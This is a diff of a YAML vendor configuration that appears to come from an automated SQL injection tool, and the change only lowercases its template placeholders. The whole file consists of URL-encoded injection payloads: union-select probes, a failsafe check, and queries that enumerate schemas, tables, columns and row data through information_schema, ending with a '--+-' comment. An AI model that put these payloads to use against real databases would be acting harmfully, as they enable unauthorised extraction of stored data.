@@ -2,7 +2,7 @@ vendor:
 resource: 
  info: |
   select 
-      'version${ENCLOSE_VALUE_SQL}dbname${ENCLOSE_VALUE_SQL}user${TRAIL_SQL}'
+      'version${enclose_value_sql}dbname${enclose_value_sql}user${trail_sql}'
       r
   from dual
   
@@ -10,97 +10,97 @@ resource:
   database: |
    select 
        rr
-       %26'${TRAIL_SQL}'
+       %26'${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            %26t.schema_name
-           %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %26'${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
           (select distinct schema_name from information_schema.schemata) t,
           (select distinct schema_name from information_schema.schemata) t1
        where t.schema_name >= t1.schema_name
        group by t.schema_name
-       {limit}
+       ${limit}
    ) a
    
   table: |
    select 
        rr
-       %26'${TRAIL_SQL}'
+       %26'${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            %26t.table_name
-           %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %26'${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-          (select distinct table_name from information_schema.tables where table_schema = '${DATABASE}') t,
-          (select distinct table_name from information_schema.tables where table_schema = '${DATABASE}') t1
+          (select distinct table_name from information_schema.tables where table_schema = '${database}') t,
+          (select distinct table_name from information_schema.tables where table_schema = '${database}') t1
        where t.table_name >= t1.table_name
        group by t.table_name
-       {limit}
+       ${limit}
    ) a
    
   column: |
    select 
        rr
-       %26'${TRAIL_SQL}'
+       %26'${trail_sql}'
        r
    from (
        select 
-           '${ENCLOSE_VALUE_SQL}'
+           '${enclose_value_sql}'
            %26t.column_name
-           %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+           %26'${separator_qte_sql}0${enclose_value_sql}'
            rr
        from
-          (select distinct column_name from information_schema.columns where table_schema = '${DATABASE}' and table_name = '${TABLE}') t,
-          (select distinct column_name from information_schema.columns where table_schema = '${DATABASE}' and table_name = '${TABLE}') t1
+          (select distinct column_name from information_schema.columns where table_schema = '${database}' and table_name = '${table}') t,
+          (select distinct column_name from information_schema.columns where table_schema = '${database}' and table_name = '${table}') t1
        where t.column_name >= t1.column_name
        group by t.column_name
-       {limit}
+       ${limit}
    ) a
    
   row: 
    query: |
     select 
         rr
-        %26'${TRAIL_SQL}'
+        %26'${trail_sql}'
         r
     from (
         select 
-            '${ENCLOSE_VALUE_SQL}'
+            '${enclose_value_sql}'
             %26t.s
-            %26'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+            %26'${separator_qte_sql}0${enclose_value_sql}'
             rr
         from
-           (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t,
-           (select distinct ${FIELDS} s from ${DATABASE}.${TABLE}) t1
+           (select distinct ${fields} s from ${database}.${table}) t,
+           (select distinct ${fields} s from ${database}.${table}) t1
         where t.s >= t1.s
         group by t.s
-        {limit}
+        ${limit}
     ) a
    fields: 
-    field: ${FIELD}
+    field: ${field}
     concat: "%26 '%7f' %26"
     
 strategy: 
  configuration: 
   slidingWindow: |
    select 
-       '${LEAD}' 
+       '${lead}' 
        %26substring(
            r, 
-           ${INDEX},
+           ${index},
            65536
        ) r 
-   from (${INJECTION})x
-  limit: having count(*) between ${LIMIT} and ${LIMIT}
-  failsafe: select '' %26 (1337${INDICE}7330%2b1) r from dual
-  calibrator: string(65536, '${CALIBRATOR_SQL}')
+   from (${injection})x
+  limit: having count(*) between ${limit.value} and ${limit.value}
+  failsafe: select '' %26 (1337${indice}7330%2b1) r from dual
+  calibrator: string(65536, '${calibrator_sql}')
   limitBoundary: 1
   endingComment: --+-
   fingerprint: 
@@ -108,6 +108,6 @@ strategy:
     - MS Access
     
  normal: 
-  indices: union select ${RESULT_RANGE} from (${INDICE_UNIQUE})
-  capacity: (select '${LEAD}${INDICE}' %26 ${CALIBRATOR} from dual)
+  indices: union select ${result_range} from (${indice_unique})
+  capacity: (select '${lead}${indice}' %26 ${calibrator} from dual)
   orderBy: order by 1337
